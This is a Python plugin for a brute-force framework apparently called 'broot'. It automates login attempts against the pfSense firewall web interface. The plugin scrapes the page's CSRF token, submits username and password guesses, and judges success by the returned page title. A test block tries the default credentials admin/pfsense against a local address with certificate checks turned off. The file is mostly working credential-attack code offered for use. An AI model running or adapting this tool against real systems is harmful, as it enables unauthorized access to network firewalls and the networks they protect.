import sys
import os
sys.path.append(os.path.join(os.getcwd(), "..", "..", "misc"))
from printlib import *
sys.path.append(os.path.join(os.getcwd(), "..", "..", "src"))
import requires
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from bs4 import BeautifulSoup
except ModuleNotFoundError:
    print_warn("Unable to find 'bs4', install?")
    ans = input("[Y/N] ")
    if ans.lower() == "y":
        requires.install('bs4')
        from bs4 import BeautifulSoup
    else:
        print_fail("'bs4' is a dependency!")
        input()

###################
#ABOUT SECTION
###################
name = "pfsense"
description = '''
The pfense plugin helps with probing the pfense web GUI authentication service to determine valid credentials.\
This is a simple plugin that comes with the default 'broot' framework.
'''
author = "midnightseer"
version = "1.0"
art = """
 (    (     (            )  (         
 )\ ) )\ )  )\ )      ( /(  )\ )      
(()/((()/( (()/( (    )\())(()/( (    
 /(_))/(_)) /(_)))\  ((_)\  /(_)))\   
(_)) (_))_|(_)) ((_)  _((_)(_)) ((_)  
| _ \| |_  / __|| __|| \| |/ __|| __| 
|  _/| __| \__ \| _| | .` |\__ \| _|  
|_|  |_|   |___/|___||_|\_||___/|___| 
                                      
"""
###################
#Executed on Import
###################
banner = '''
{}
{}
Author:  {}
Version: {}'''.format(art,name,author,version)
print(banner)
###################

#This is an example, you do not necessarily need extra commands
plugin_cmds = {

}

#This is an example, variables must have a unique name
plugin_vars = {
    'ssl': {
        "Name": "SSL",
        "Value": False,
        "Type": 'Boolean',
        "Default": False,
        "Help": "Enable SSL for the http connection.",
        "Example": "Enable SSL: https"
    },
    'port': {
        "Name": "Port",
        "Value": None,
        "Type": 'Integer',
        "Default": "Not set",
        "Help": "Target port for the http connection.",
        "Example": "port '80'" 
    },
    'user-agent': {
        "Name": "User-Agent",
        "Value": "broot",
        "Type": 'String',
        "Default": "broot",
        "Help": "Change the user-agent for the web requests",
        "Example": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    },
    'verify-cert': {
        "Name": "Verify-Cert",
        "Value": False,
        "Type": 'Boolean',
        "Default": False,
        "Help": "Proceed or halt connections with 'untrusted' ssl certificates",
        "Example": "False"
    }
}

def run(username, password, target):
    attempt = "Target:{} Username:{} Password:{}".format(target, username, password)
    verbose = plugin_vars['verbose']['Value']

    if plugin_vars['ssl']['Value'] is True and var.global_vars['target-port']['Value'] is None:
        port = 443
    elif var.global_vars['target-port']['Value'] is not None:
        port = var.global_vars['target-port']['Value']

    if plugin_vars['ssl']['Value'] is True:
        preface = 'https'
    else:
        preface = 'http'

    user_agent = plugin_vars['user-agent']['Value']

    target_url = "{}://{}:{}".format(preface, target, str(port))
    with requests.Session() as s:
        response = s.get(target_url, verify=plugin_vars['verify-cert']['Value'])
        soup = BeautifulSoup(response.content, "html.parser")
        #print(soup)
        csrf_token = soup.input['value']
        referer = "{}://{}".format(preface, target)
        login_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': user_agent,
            'Referer': referer
        }
        login_payload = {
            'usernamefld': username,
            'passwordfld': password,
            'login': 'Sign In',
            '__csrf_magic': csrf_token
        }
        response = s.post(target_url, data=login_payload, headers=login_headers, verify=plugin_vars['verify-cert']['Value'])
        soup = BeautifulSoup(response.content, "html.parser")
        if soup.title.text.lower() != "login":
            return True
        else:
            return False
            
if __name__ == "__main__":
#for testing only
    plugin_vars['ssl']['Value'] = True
    plugin_vars['verify-cert']['Value'] = False
    plugin_vars['verbose']['Value'] = True
    username = "admin"
    password = 'pfsense'
    target = "192.168.1.254"

    run(username, password, target)